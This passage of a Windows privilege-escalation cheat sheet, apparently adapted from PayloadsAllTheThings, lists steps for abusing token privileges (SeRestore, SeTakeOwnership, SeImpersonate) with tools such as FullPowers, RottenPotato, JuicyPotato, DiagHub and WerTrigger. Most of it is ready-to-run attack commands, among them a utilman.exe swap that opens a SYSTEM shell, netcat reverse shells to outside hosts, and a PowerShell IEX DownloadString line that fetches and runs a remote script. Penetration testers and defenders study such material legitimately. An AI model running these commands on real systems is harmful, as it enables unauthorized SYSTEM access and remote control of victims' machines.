|`SeRestore`| ***Admin*** | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
|`SeTakeOwnership`| ***Admin*** | ***Built-in commands*** |1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
|`SeTcb`| ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||


##### Restore A Service Account's Privileges

> This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.

```powershell
# https://github.com/itm4n/FullPowers

c:\TOOLS>FullPowers
[+] Started dummy thread with id 9976
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19041.84]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
```


##### Meterpreter getsystem and alternatives

```powershell
meterpreter> getsystem 
Tokenvator.exe getsystem cmd.exe 
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
psexec -s -i cmd.exe 
python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
```

##### RottenPotato (Token Impersonation)

Binary available at : https://github.com/foxglovesec/RottenPotato
Binary available at : https://github.com/breenmachine/RottenPotatoNG

```c
getuid
getprivs
use incognito
list\_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate\_token "NT AUTHORITY\SYSTEM"
```

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```


##### Juicy Potato (abusing the golden privileges)

Binary available at : https://github.com/ohpe/juicy-potato/releases    
:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +. 

1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)

```powershell
whoami /priv
```

2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object

    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise) 
    * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
    * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
    * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise) 
    * [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard) 

3. Execute JuicyPotato to run a privileged command.

```powershell
    JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
    JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
    JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
        Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
        ......
        [+] authresult 0
        {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
        [+] CreateProcessWithTokenW OK
```

#### EoP - Privileged File Write

##### DiagHub

:warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.

The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM. 
This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the `C:\Windows\System32` directory. 

Exploit:

1. Create an [evil DLL](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0) e.g: payload.dll and move it into `C:\Windows\System32`
2. Build https://github.com/xct/diaghub
3. `diaghub.exe c:\\ProgramData\\ payload.dll`

The default payload will run `C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe`

Alternative tools:
* https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag
* https://github.com/decoder-it/diaghub_exploit


##### UsoDLLLoader

:warning: 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.

> An alternative to the DiagHub DLL loading "exploit" found by James Forshaw (a.k.a. @tiraniddo)

If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of `windowscoredeviceinfo.dll` into `C:\Windows\Sytem32\` and then have it loaded by the USO service to get arbitrary code execution as **NT AUTHORITY\System**.

Exploit:

1. Build https://github.com/itm4n/UsoDllLoader
    * Select Release config and x64 architecure.
    * Build solution.
        * DLL .\x64\Release\WindowsCoreDeviceInfo.dll
        * Loader .\x64\Release\UsoDllLoader.exe.
2. Copy `WindowsCoreDeviceInfo.dll` to `C:\Windows\System32\`
3. Use the loader and wait for the shell or run `usoclient StartInteractiveScan` and connect to the bind shell on port 1337.


##### WerTrigger

> Weaponizing for privileged file writes bugs with Windows problem reporting

1. Clone https://github.com/sailay1996/WerTrigger
2. Copy `phoneinfo.dll` to `C:\Windows\System32\`
3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
4. Then, run `WerTrigger.exe`.
5. Enjoy a shell as **NT AUTHORITY\SYSTEM**


#### EoP - Common Vulnerabilities and Exposure

通用漏洞

|名称|类型|适用环境|描述|
|:-------------:|--|--|-----|
|Token Impersonation (RottenPotato)|/|/|/|
|MS08-067 (NetAPI)|系统漏洞|Windows 2000/XP/Server 2003/Vista/Server 2008)|Remote Code Execution|
|MS16-032|系统漏洞|windows 7/8/10/2008/2012|Secondary Logon Handle. 补丁编号: KB3143141|
|MS17-010 (Eternal Blue)|系统漏洞|/|Windows Kernel Mode Drivers|windows 7/2008/2003/XP|补丁编号: KB4013389|
|CVE-2018-8120|Kernel Exploitation|(Windows 7 SP1/2008 SP2,2008 R2 SP1)x86 x64|[Win32k Elevation of Privilege Vulnerability]|
|[Win10Pcap-Exploit](https://github.com/Rootkitsmm/Win10Pcap-Exploit)|应用程序漏洞|win10|Exploit Win10Pcap Driver to enable some Privilege in our process token ( local Privilege escalation)|


检查补丁是否安装 `wmic qfe list | findstr "3139914"`

#### References

* 参考
  * [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#token-impersonation-rottenpotato)
  * [Windows-Notes-and-Cheatsheet.md](https://github.com/m0chan/m0chan.github.io/blob/master/_posts/2019-07-30-Windows-Notes-and-Cheatsheet.md)
* 参考资料
  * [Windows Internals Book - 02/07/2017](https://docs.microsoft.com/en-us/sysinternals/learn/windows-internals)
  * [icacls - Docs Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
  * [Privilege Escalation Windows - Philip Linghammar](https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html)
  * [Windows elevation of privileges - Guifre Ruiz](https://guif.re/windowseop)
  * [The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte](https://addaxsoft.com/wpecs/)
  * [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
  * [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
  * [TOP–10 ways to boost your privileges in Windows systems - hackmag](https://hackmag.com/security/elevating-privileges-to-administrative-and-further/)
  * [The SYSTEM Challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)
  * [Windows Privilege Escalation Guide - absolomb's security blog](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
  * [Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs](https://github.com/dostoevskylabs/dostoevsky-pentest-notes/blob/master/chapter-4.md)
  * [Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell](https://www.tecklyfe.com/remediation-microsoft-windows-unquoted-service-path-enumeration-vulnerability/)
  * [Pentestlab.blog - WPE-01 - Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)
  * [Pentestlab.blog - WPE-02 - Windows Kernel](https://pentestlab.blog/2017/04/24/windows-kernel-exploits/)
  * [Pentestlab.blog - WPE-03 - DLL Injection](https://pentestlab.blog/2017/04/04/dll-injection/)
  * [Pentestlab.blog - WPE-04 - Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/)
  * [Pentestlab.blog - WPE-05 - DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/)
  * [Pentestlab.blog - WPE-06 - Hot Potato](https://pentestlab.blog/2017/04/13/hot-potato/)
  * [Pentestlab.blog - WPE-07 - Group Policy Preferences](https://pentestlab.blog/2017/03/20/group-policy-preferences/)
  * [Pentestlab.blog - WPE-08 - Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
  * [Pentestlab.blog - WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/) 
  * [Pentestlab.blog - WPE-10 - Token Manipulation](https://pentestlab.blog/2017/04/03/token-manipulation/)
  * [Pentestlab.blog - WPE-11 - Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)
  * [Pentestlab.blog - WPE-12 - Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
  * [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)
  * [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
  * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
  * [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
  * [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
  * [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/howto/2019/03/07/diaghub.html)
  * [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
  * [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
